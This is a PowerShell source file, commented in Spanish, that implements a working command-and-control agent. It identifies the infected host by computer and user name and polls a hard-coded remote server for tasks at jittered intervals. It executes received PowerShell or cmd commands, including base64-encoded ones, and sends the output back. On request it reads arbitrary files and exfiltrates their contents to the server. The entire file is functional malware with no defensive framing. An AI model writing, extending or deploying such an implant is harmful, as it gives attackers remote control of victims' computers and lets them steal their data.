# agent.ps1 (MVP Fase 3 - core_services_mvp3.ps1)
# Agente con bucle de tareas, ejecución de comandos, envío de resultados y exfiltración de archivos.

# --- CONFIGURACIÓN ---
$c2BaseUrl = "https://exa-sw-fr2c.onrender.com" # URL actualizada de tu C2 en Render
$InitialSleepSeconds = 10 
$LoopSleepSecondsBase = 60 
$JitterPercentage = 0.3 
# --------------------

$agentId = try {
    $computerName = $env:COMPUTERNAME
    $userName = $env:USERNAME
    $rawAgentId = "$($computerName)_$($userName)"
    $cleanedAgentId = $rawAgentId -replace '[^a-zA-Z0-9_-]', '' 
    if ([string]::IsNullOrWhiteSpace($cleanedAgentId)) { "UnknownAgent_F3_$(Get-Random)" } else { $cleanedAgentId }
} catch {
    "UnknownAgent_F3_$(Get-Random)" 
}

# Función para enviar datos al C2 (POST JSON)
function Send-DataToC2 {
    param(
        [string]$UriPath,
        [object]$Data
    )
    $fullUrl = "$($c2BaseUrl)$($UriPath)"
    try {
        # Write-Host "DEBUG: Enviando datos a $fullUrl : $($Data | ConvertTo-Json -Depth 5)"
        Invoke-RestMethod -Uri $fullUrl -Method Post -Body ($Data | ConvertTo-Json -Depth 5) -ContentType "application/json" -TimeoutSec 60 -UseBasicParsing # Aumentado Timeout para posible exfiltración
    } catch {
        Write-Warning "Error enviando datos a $fullUrl : $($_.Exception.Message)"
    }
}

# Función para obtener tareas del C2
function Get-TaskFromC2 {
    param(
        [string]$AgentIdParam
    )
    $taskUrl = "$($c2BaseUrl)/api/tasks/$($AgentIdParam)/get"
    try {
        # Write-Host "DEBUG: Solicitando tarea desde $taskUrl"
        $response = Invoke-RestMethod -Uri $taskUrl -Method Get -TimeoutSec 30 -UseBasicParsing
        return $response
    } catch {
        Write-Warning "Error obteniendo tarea desde $taskUrl : $($_.Exception.Message)"
        return $null
    }
}

# Pausa inicial
Start-Sleep -Seconds $InitialSleepSeconds

# Bucle principal del agente
while ($true) {
    $task = Get-TaskFromC2 -AgentIdParam $agentId
    
    if ($null -ne $task -and $task.command -ne "sleep") { # 'command' podría no ser 'sleep' si 'type' es 'sleep'
        # Write-Host "DEBUG: Tarea recibida: $($task | ConvertTo-Json -Depth 3)"
        $output = ""
        $errorOutput = ""
        $taskResult = @{
            task_id = $task.task_id
            status = "completed" 
            output = ""
        }

        try {
            $commandToExecute = $task.command
            $decodedPayloadPath = $null # Para exfiltración de archivos

            if ($task.payload_b64) {
                try {
                    $decodedPayload = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($task.payload_b64))
                    if ($task.type -eq "powershell_b64" -or $task.type -eq "cmd_b64") {
                        $commandToExecute = $decodedPayload
                    } elseif ($task.type -eq "exfiltrate_file") {
                        $decodedPayloadPath = $decodedPayload # La ruta del archivo a exfiltrar
                    }
                    # Podrían añadirse más usos del payload aquí
                } catch {
                    $errorOutput += "Error decodificando payload_b64: $($_.Exception.Message)`n"
                    $taskResult.status = "error_decoding_payload"
                }
            }
            
            if ($taskResult.status -ne "error_decoding_payload") {
                if ($task.type -eq "powershell" -or $task.type -eq "powershell_b64") {
                    # Write-Host "DEBUG: Ejecutando PowerShell: $commandToExecute"
                    $scriptBlock = [Scriptblock]::Create($commandToExecute)
                    $output = Invoke-Command -ScriptBlock $scriptBlock 2>&1 | Out-String
                } elseif ($task.type -eq "cmd" -or $task.type -eq "cmd_b64") {
                    # Write-Host "DEBUG: Ejecutando CMD: $commandToExecute"
                    $output = cmd.exe /c "$($commandToExecute)" 2>&1 | Out-String
                } elseif ($task.type -eq "exfiltrate_file") {
                    if ($null -ne $decodedPayloadPath -and (Test-Path $decodedPayloadPath -PathType Leaf)) {
                        # Write-Host "DEBUG: Exfiltrando archivo: $decodedPayloadPath"
                        try {
                            $fileBytes = [System.IO.File]::ReadAllBytes($decodedPayloadPath)
                            $output = [System.Convert]::ToBase64String($fileBytes)
                            $taskResult.status = "file_exfiltrated"
                        } catch {
                            $output = "Error leyendo archivo para exfiltrar '$($decodedPayloadPath)': $($_.Exception.Message)"
                            $taskResult.status = "error_exfiltrating_file_read"
                        }
                    } else {
                        $output = "Error exfiltrando archivo: Ruta inválida o no es un archivo '$($decodedPayloadPath)'."
                        $taskResult.status = "error_exfiltrating_file_path"
                    }
                } else {
                    $output = "Tipo de comando desconocido: $($task.type)"
                    $taskResult.status = "unknown_command_type"
                }
            }
        } catch {
            $errorOutput += "Error ejecutando comando o tarea: $($_.Exception.Message)`n$($_.ScriptStackTrace)"
            $taskResult.status = "execution_error"
        }
        
        if (-not [string]::IsNullOrWhiteSpace($errorOutput)) {
            $output = if (-not [string]::IsNullOrWhiteSpace($output)) { "$($output)`n---ERRORS---`n$($errorOutput)" } else { $errorOutput }
        }
        
        # Solo codificar a Base64 si no es ya el contenido de un archivo exfiltrado (que ya está en Base64)
        if ($taskResult.status -ne "file_exfiltrated" -and $taskResult.status -ne "error_exfiltrating_file_read" -and $taskResult.status -ne "error_exfiltrating_file_path") {
            $taskResult.output = try { [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($output)) } catch { "Error_Encoding_Output_To_Base64" }
        } elseif ($taskResult.status -eq "file_exfiltrated") {
            $taskResult.output = $output # Ya está en Base64
        } else { # Errores de exfiltración, codificar el mensaje de error
             $taskResult.output = try { [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($output)) } catch { "Error_Encoding_Error_Msg_To_Base64" }
        }
        
        Send-DataToC2 -UriPath "/api/results/$($agentId)/send" -Data $taskResult
        
    }
    
    $jitter = Get-Random -Minimum (-$LoopSleepSecondsBase * $JitterPercentage) -Maximum ($LoopSleepSecondsBase * $JitterPercentage)
    $actualSleep = [int]($LoopSleepSecondsBase + $jitter)
    if ($actualSleep -lt 5) { $actualSleep = 5 } 
    Start-Sleep -Seconds $actualSleep
}
